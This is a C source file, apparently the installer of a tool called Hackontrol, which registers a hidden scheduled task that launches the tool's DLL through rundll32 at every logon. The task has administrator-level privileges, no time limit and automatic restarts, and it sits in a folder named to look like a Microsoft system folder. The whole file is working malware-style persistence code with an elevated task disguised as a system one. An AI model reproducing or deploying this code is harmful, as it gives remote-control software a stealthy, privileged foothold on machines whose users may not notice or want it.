#include <libkhopan.h>
#include <libhackontrol.h>
#include <taskschd.h>

#define FUNCTION_LIBDLL32 L"Execute"
#define TASK_FILE         L"Startup"
#define TASK_FOLDER       L"Microsoft\\Windows\\Registry"

__declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"CoInitializeEx");
		return;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"CoInitializeSecurity");
		goto uninitialize;
	}

	ITaskService* taskService;
	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"CoCreateInstance");
		goto uninitialize;
	}

	VARIANT emptyVariant = {VT_EMPTY};
	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::Connect");
		taskService->lpVtbl->Release(taskService);
		goto uninitialize;
	}

	ITaskFolder* rootFolder;
	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::GetFolder");
		taskService->lpVtbl->Release(taskService);
		goto uninitialize;
	}

	ITaskFolder* taskFolder;
	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER, emptyVariant, &taskFolder);

	if(result == 0x800700B7) {
		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER, &taskFolder);
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::GetFolder");
			taskService->lpVtbl->Release(taskService);
			goto uninitialize;
		}
	} else {
		rootFolder->lpVtbl->Release(rootFolder);

		if(FAILED(result)) {
			KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::CreateFolder");
			taskService->lpVtbl->Release(taskService);
			goto uninitialize;
		}
	}

	ITaskDefinition* taskDefinition;
	result = taskService->lpVtbl->NewTask(taskService, 0, &taskDefinition);
	taskService->lpVtbl->Release(taskService);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::NewTask");
		goto releaseTaskFolder;
	}
	
	IPrincipal* principal;
	result = taskDefinition->lpVtbl->get_Principal(taskDefinition, &principal);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Principal");
		goto releaseTaskDefinition;
	}

	result = principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IPrincipal::put_RunLevel");
		principal->lpVtbl->Release(principal);
		goto releaseTaskDefinition;
	}

	result = principal->lpVtbl->put_UserId(principal, L"S-1-5-32-544");
	principal->lpVtbl->Release(principal);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IPrincipal::put_UserId");
		goto releaseTaskDefinition;
	}

	ITriggerCollection* triggerCollection;
	result = taskDefinition->lpVtbl->get_Triggers(taskDefinition, &triggerCollection);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Triggers");
		goto releaseTaskDefinition;
	}

	ITrigger* trigger;
	result = triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_LOGON, &trigger);
	triggerCollection->lpVtbl->Release(triggerCollection);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITriggerCollection::Create");
		goto releaseTaskDefinition;
	}

	trigger->lpVtbl->Release(trigger);
	IActionCollection* actionCollection;
	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Actions");
		goto releaseTaskDefinition;
	}

	IAction* action;
	result = actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action);
	actionCollection->lpVtbl->Release(actionCollection);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IActionCollection::Create");
		goto releaseTaskDefinition;
	}

	IExecAction* executeAction;
	result = action->lpVtbl->QueryInterface(action, &IID_IExecAction, &executeAction);
	action->lpVtbl->Release(action);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IAction::QueryInterface");
		goto releaseTaskDefinition;
	}

	LPWSTR fileRundll32 = KHOPANFileGetRundll32();

	if(!fileRundll32) {
		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANFileGetRundll32");
		executeAction->lpVtbl->Release(executeAction);
		goto releaseTaskDefinition;
	}

	result = executeAction->lpVtbl->put_Path(executeAction, fileRundll32);
	LocalFree(fileRundll32);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_Path");
		executeAction->lpVtbl->Release(executeAction);
		goto releaseTaskDefinition;
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		executeAction->lpVtbl->Release(executeAction);
		goto releaseTaskDefinition;
	}

	LPWSTR argumentRundll32 = KHOPANFormatMessage(L"\"%ws\\" FILE_LIBDLL32 L"\" " FUNCTION_LIBDLL32, folderHackontrol);

	if(!argumentRundll32) {
		KHOPANERRORMESSAGE_WIN32(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		LocalFree(folderHackontrol);
		executeAction->lpVtbl->Release(executeAction);
		goto releaseTaskDefinition;
	}

	result = executeAction->lpVtbl->put_Arguments(executeAction, argumentRundll32);
	LocalFree(argumentRundll32);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_Arguments");
		LocalFree(folderHackontrol);
		executeAction->lpVtbl->Release(executeAction);
		goto releaseTaskDefinition;
	}

	result = executeAction->lpVtbl->put_WorkingDirectory(executeAction, folderHackontrol);
	LocalFree(folderHackontrol);
	executeAction->lpVtbl->Release(executeAction);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_WorkingDirectory");
		goto releaseTaskDefinition;
	}

	ITaskSettings* taskSettings = NULL;
	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Settings");
		goto releaseTaskDefinition;
	}

	result = taskSettings->lpVtbl->put_AllowDemandStart(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_AllowDemandStart");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_StartWhenAvailable(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_StartWhenAvailable");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RestartInterval(taskSettings, L"PT1M");

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RestartInterval");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RestartCount(taskSettings, 5);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RestartCount");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_ExecutionTimeLimit(taskSettings, L"PT0M");

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_ExecutionTimeLimit");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_DisallowStartIfOnBatteries(taskSettings, VARIANT_FALSE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_StopIfGoingOnBatteries(taskSettings, VARIANT_FALSE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_WakeToRun(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_WakeToRun");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_RunOnlyIfNetworkAvailable(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
		goto releaseTaskSettings;
	}

	result = taskSettings->lpVtbl->put_Hidden(taskSettings, VARIANT_TRUE);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_Hidden");
		goto releaseTaskSettings;
	}
	
	taskFolder->lpVtbl->DeleteTask(taskFolder, TASK_FILE, 0);
	IRegisteredTask* registeredTask;
	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_FILE, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &registeredTask);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::RegisterTaskDefinition");
		goto releaseTaskSettings;
	}

	MessageBoxW(NULL, L"Hackontrol successfully installed on your machine!", L"Hackontrol Installer", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	IRunningTask* runningTask;
	result = registeredTask->lpVtbl->Run(registeredTask, emptyVariant, &runningTask);
	registeredTask->lpVtbl->Release(registeredTask);

	if(FAILED(result)) {
		KHOPANERRORMESSAGE_WIN32(result, L"IRegisteredTask::Run");
		goto releaseTaskSettings;
	}

	runningTask->lpVtbl->Release(runningTask);
releaseTaskSettings:
	taskSettings->lpVtbl->Release(taskSettings);
releaseTaskDefinition:
	taskDefinition->lpVtbl->Release(taskDefinition);
releaseTaskFolder:
	taskFolder->lpVtbl->Release(taskFolder);
uninitialize:
	CoUninitialize();
}
